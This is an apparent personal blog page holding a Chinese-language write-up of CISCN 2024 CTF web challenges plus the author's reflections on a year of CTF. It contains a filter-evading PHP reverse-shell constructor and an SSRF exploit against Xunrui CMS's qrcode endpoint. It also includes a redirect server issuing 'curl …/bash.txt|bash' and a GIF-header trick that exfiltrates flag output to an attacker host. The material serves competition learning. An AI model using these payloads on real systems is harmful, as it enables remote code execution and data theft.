@@ -1,0 +1,211 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2024ciscnWeb题解及一些思考 | 柚子のBlog</title><meta name="author" content="yoo2i"><meta name="copyright" content="yoo2i"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="WebSimple_PHP过滤了很多东西，首先尝试参数逃逸不太成功。 然后发现它ban的大多数是查看文件的，和它杠到底，base32没过滤干净，可以读文件，但是.?*这种通配符被ban了，不太好描述文件啊。 考虑反弹shell，通过拼接构造： 12345678&lt;?php	$c&#x3D;array_keys(localeconv())[3][0];	$h&#x3D;array_keys(localeconv()">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024ciscnWeb题解及一些思考">
+<meta property="og:url" content="https://yoo2i.github.io/2024/05/21/2024ciscnWeb%E9%A2%98%E8%A7%A3%E5%8F%8A%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/index.html">
+<meta property="og:site_name" content="柚子のBlog">
+<meta property="og:description" content="WebSimple_PHP过滤了很多东西，首先尝试参数逃逸不太成功。 然后发现它ban的大多数是查看文件的，和它杠到底，base32没过滤干净，可以读文件，但是.?*这种通配符被ban了，不太好描述文件啊。 考虑反弹shell，通过拼接构造： 12345678&lt;?php	$c&#x3D;array_keys(localeconv())[3][0];	$h&#x3D;array_keys(localeconv()">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yoo2i.github.io/img/avatar.png">
+<meta property="article:published_time" content="2024-05-21T04:40:18.000Z">
+<meta property="article:modified_time" content="2024-05-21T04:40:52.255Z">
+<meta property="article:author" content="yoo2i">
+<meta property="article:tag" content="ciscn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yoo2i.github.io/img/avatar.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://yoo2i.github.io/2024/05/21/2024ciscnWeb%E9%A2%98%E8%A7%A3%E5%8F%8A%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2024ciscnWeb题解及一些思考',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-05-21 12:40:52'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="柚子のBlog"><span class="site-name">柚子のBlog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2024ciscnWeb题解及一些思考</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-05-21T04:40:18.000Z" title="发表于 2024-05-21 12:40:18">2024-05-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-05-21T04:40:52.255Z" title="更新于 2024-05-21 12:40:52">2024-05-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/">比赛记录</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2024ciscnWeb题解及一些思考"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Simple-PHP"><a href="#Simple-PHP" class="headerlink" title="Simple_PHP"></a>Simple_PHP</h2><p>过滤了很多东西，首先尝试参数逃逸不太成功。</p>
+<p>然后发现它ban的大多数是查看文件的，和它杠到底，base32没过滤干净，可以读文件，但是.?*这种通配符被ban了，不太好描述文件啊。</p>
+<p>考虑反弹shell，通过拼接构造：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$c</span>=<span class="title function_ invoke__">array_keys</span>(<span class="title function_ invoke__">localeconv</span>())[<span class="number">3</span>][<span class="number">0</span>];</span><br><span class="line">	<span class="variable">$h</span>=<span class="title function_ invoke__">array_keys</span>(<span class="title function_ invoke__">localeconv</span>())[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">	<span class="variable">$r</span>=<span class="title function_ invoke__">array_keys</span>(<span class="title function_ invoke__">localeconv</span>())[<span class="number">2</span>][<span class="number">6</span>];</span><br><span class="line">	<span class="variable">$f</span>=<span class="title function_ invoke__">join</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="variable">$c</span>,<span class="variable">$h</span>,<span class="variable">$r</span>));</span><br><span class="line">	<span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">join</span>(<span class="literal">null</span>,<span class="keyword">array</span>(</span><br><span class="line">        <span class="variable">$f</span>(<span class="number">98</span>),<span class="variable">$f</span>(<span class="number">97</span>),<span class="variable">$f</span>(<span class="number">115</span>),<span class="variable">$f</span>(<span class="number">104</span>),<span class="variable">$f</span>(<span class="number">32</span>),<span class="variable">$f</span>(<span class="number">45</span>),<span class="variable">$f</span>(<span class="number">99</span>),<span class="variable">$f</span>(<span class="number">32</span>),<span class="variable">$f</span>(<span class="number">34</span>),<span class="variable">$f</span>(<span class="number">98</span>),<span class="variable">$f</span>(<span class="number">97</span>),<span class="variable">$f</span>(<span class="number">115</span>)</span><br><span class="line">    )));<span class="comment">//通过这种方式构造命令，我删了后半截有关我vps的ip的部分</span></span><br></pre></td></tr></table></figure>
+
+<p>获得shell之后没找到flag文件，看一下内网环境：<code>ss -tuln</code></p>
+<p>发现有3306端口开着，flag藏在里面。</p>
+<p>使用mysql -u root -p root登录</p>
+<p>SHOW DATABASES;</p>
+<p>USE PHP_CMS;</p>
+<p>SELECT * FROM F1ag_Se3Re7;</p>
+<p>获得flag。</p>
+<p>最蛋疼的还是登录mysql执行命令无回显，等你退出之后回显才会出来。。。。</p>
+<h2 id="esaycms"><a href="#esaycms" class="headerlink" title="esaycms"></a>esaycms</h2><p>迅睿cms，结合提示考虑ssrf。</p>
+<p>搜一下公开情报可以发现：<a target="_blank" rel="noopener" href="https://www.xunruicms.com/bug/">迅睿CMS漏洞公示,四川迅睿云软件开发有限公司厂商的漏洞列表 (xunruicms.com)</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CNVD-C-2022-423202	2022-08-17	4.5.6	已修复	中危	qrcode存在SSRF漏洞，需开启Redis服务</span><br></pre></td></tr></table></figure>
+
+<p>有了一个大概的方向，然后提示说可以找源码。</p>
+<p>GitHub上确实搜到了源码，但是是官方发的，<del>当时根本不敢确定这个是不是题目要让我审的</del></p>
+<p>在helper.php中能发现调用方法：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=&#x27;.urlencode($thumb).&#x27;&amp;text=&#x27;.urlencode($text).&#x27;&amp;size=&#x27;.$size.&#x27;&amp;level=&#x27;.$level</span><br></pre></td></tr></table></figure>
+
+<p>这里面的thumb就是我们要插入的链接了，Api.php中的qrcode()函数会对$thumb调用dr_catcher_data()函数，而这个函数会对传入的url执行curl从而ssrf。</p>
+<p>所以打通的payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=http://x.x.x.x:xxxx/redirect&amp;text=1&amp;size=1&amp;level=1</span><br></pre></td></tr></table></figure>
+
+<p>本机python3启动下面这个脚本提供redirect功能：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.path == <span class="string">&#x27;/redirect&#x27;</span>:</span><br><span class="line">            self.send_response(<span class="number">302</span>)</span><br><span class="line">            self.send_header(<span class="string">&#x27;Location&#x27;</span>, <span class="string">&#x27;http://127.0.0.1/flag.php?cmd=curl https://x.x.x.x:xxxx/bash.txt|bash&#x27;</span>)</span><br><span class="line">            self.end_headers()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.send_response(<span class="number">404</span>)</span><br><span class="line">            self.end_headers()</span><br><span class="line">            self.wfile.write(<span class="string">b&#x27;404 Not Found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">server_class=HTTPServer, handler_class=MyHandler, port=<span class="number">3306</span></span>):</span><br><span class="line">    server_address = (<span class="string">&#x27;&#x27;</span>, port)</span><br><span class="line">    httpd = server_class(server_address, handler_class)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Starting server on port <span class="subst">&#123;port&#125;</span>...&#x27;</span>)</span><br><span class="line">    httpd.serve_forever()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>
+
+<p>同时vps上也要提供一个http服务器来供它获取bash.txt <code>python3 -m http.server</code></p>
+<p>最后是为了反弹shell监听的端口 <code>nc -lvp xxxx</code></p>
+<p>拿到shell后去根目录执行.&#x2F;readflag</p>
+<h2 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h2><p>和上面的题一样的payload，但是能访问到自己的靶机（能出网）却并不能访问到提供bash.txt的http服务器。</p>
+<p>尝试ping了一下自己也是ping不通，以为是curl和ping都被ban了。</p>
+<p>以下为学习<a target="_blank" rel="noopener" href="https://www.nynusec.com/post/1001/">第十七届全国大学生信息安全竞赛CISCN线上赛部分Writeup - NYNUSEC</a>复现</p>
+<p>看了wp才知道会检测图片头。。。。比赛的时候想比较两个题目的不同，但是开一个另一个就关了，加上自己心态比较急，没有get到题目中“此图片不是一张可用的图片”这个提示的含义，还是题做少了，思路太局限啦。伪造文件头单拎出来也会，但是没有get到这个脑洞。</p>
+<p>需要给重定向文件伪造文件头：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1/flag.php?cmd=curl http://x.x.x.x:8000/`/readflag | base64`&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>伪造GIF头就让它以为是图片了。</p>
+<p>不知为何，上一题的反弹shell方法死活弹不上，所以换了这种外带数据的方式。</p>
+<p>对于不在本文件夹的可执行文件只需要在它前面加上路径就可以执行了。</p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="火锅"><a href="#火锅" class="headerlink" title="火锅"></a>火锅</h2><p>下载它需要的插件，然后答题，答对七次（不能重复）就给flag了。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>​	一转眼接触ctf将近一年整。23年的5月第一次参加spirit校赛，只懂一点html的菜鸡勇闯Web，结果自然是铩羽而归；记得那天的茶歇很好吃，但是签到都差点没有签上，是一个响应包响应头有flagbase64编码的究极签到题。6月底抑或是7月初，暑假开始，我也正式开始学习web的旅程，同时打了西电等校的新生赛，那次的Web压轴题是一个简单的内网渗透，却让我感受到了现实世界中进行渗透的魅力，以及拿下一台主机那种难以言表的兴奋；当时好像只练过本地环境的反弹shell，导致尝试反弹的时候往局域网ip弹，还疑惑了一下午为什么弹不上，最终在本校师傅和出题师傅的帮助下才解决这些问题。开学之后打了一些新生赛，同时再次参加了spirit的校赛，这次不再爆零，但也只是做出了两道平平无奇的easy题，第三题是在js脚本中的jsfuck编码，并不困难，只是做题时焦急的心态放过了这个点子，错失flag；参加完这次校赛后成功进队，但深感自己代码能力和web技术都很差，主线任务变成了写cs144穿插学web，感到自己进入了一种看wp差不多，自己做却做不出来的瓶颈期，手也变得懒了，随队打了些网络赛不过输出都一般。寒假期间因为自己心态原因和一些家庭因素没怎么学习，完全没有暑假那种学web的热情和冲劲。开学之后，也就是现在这个学期，一边刷cs61b一边学web，也打了一些比赛，长城杯爆零，校赛输出了一些。常常觉得自己这种web安全纯混子一定是找不到工作的吧，毕竟coding能力只能算半吊子也反感去背八股卷开发，web安全上只能说略懂，算不上精通；却又时常幻想哪家公司眼瞎，说不定也会收留自己；转折点在今年五一，过于现实的外力因素让我明确了就是自己就是欠缺很多的事实，摆脱了过去那种鸵鸟心态：只要把头埋进“找工作”的沙堆里就可以麻痹自己得过且过，尝试去考研给自己一个新的学习机会；上周末的国赛可能是大学期间最后一次参赛，带着无所谓、享受比赛的心态，却有了自己生涯最好的发挥，当周日下午做出第一天的cms却被第二天的cms卡住时仿佛有种解脱的快感，冥冥之中仿佛有人告诉我你尽力了，但是水平也确实就到这里。</p>
+<p>​	我算不上很有天赋或者很勤奋的web手，在这短短一年的时间里经常因为自己易碎的心态而错失良机，瓶颈期也时常怀疑自己对安全的热情究竟存不存在。悟已往之不谏，知来者之可追，回忆自己最初接触ctf的时候，深感对于计算机的了解太少只会刷刷算法题，这才选择了web这个知识面很广的方向；纵使现在有这样那样的困扰，也该守住学习知识的初心。</p>
+<p>​	由于考研开始的较晚，今年可能不会再有什么文章更新了，不过再见不是永别。青山不改，绿水长流，咱们后会有期！</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://yoo2i.github.io">yoo2i</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://yoo2i.github.io/2024/05/21/2024ciscnWeb%E9%A2%98%E8%A7%A3%E5%8F%8A%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/">https://yoo2i.github.io/2024/05/21/2024ciscnWeb%E9%A2%98%E8%A7%A3%E5%8F%8A%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://yoo2i.github.io" target="_blank">柚子のBlog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ciscn/">ciscn</a></div><div class="post_share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/05/20/gitlet-design/" title="gitlet-design"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">gitlet-design</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">yoo2i</div><div class="author-info__description">No one</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎联系邮箱yoo2i@qq.com与我交流~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Simple-PHP"><span class="toc-number">1.1.</span> <span class="toc-text">Simple_PHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#esaycms"><span class="toc-number">1.2.</span> <span class="toc-text">esaycms</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easycms-revenge"><span class="toc-number">1.3.</span> <span class="toc-text">easycms_revenge</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%81%AB%E9%94%85"><span class="toc-number">2.1.</span> <span class="toc-text">火锅</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">3.</span> <span class="toc-text">后记</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/21/2024ciscnWeb%E9%A2%98%E8%A7%A3%E5%8F%8A%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/" title="2024ciscnWeb题解及一些思考">2024ciscnWeb题解及一些思考</a><time datetime="2024-05-21T04:40:18.000Z" title="发表于 2024-05-21 12:40:18">2024-05-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/20/gitlet-design/" title="gitlet-design">gitlet-design</a><time datetime="2024-05-20T15:10:38.000Z" title="发表于 2024-05-20 23:10:38">2024-05-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/13/ctfshow-SSRF/" title="ctfshow_SSRF">ctfshow_SSRF</a><time datetime="2024-05-13T13:08:51.000Z" title="发表于 2024-05-13 21:08:51">2024-05-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/22/cs61b-proj%E9%97%AE%E9%A2%98%E9%9B%86%E5%90%88/" title="cs61b-proj问题集合">cs61b-proj问题集合</a><time datetime="2024-01-22T02:53:07.000Z" title="发表于 2024-01-22 10:53:07">2024-01-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/22/2024SBCTF-Week1/" title="2024SBCTF-Week1">2024SBCTF-Week1</a><time datetime="2024-01-22T00:46:43.000Z" title="发表于 2024-01-22 08:46:43">2024-01-22</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By yoo2i</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
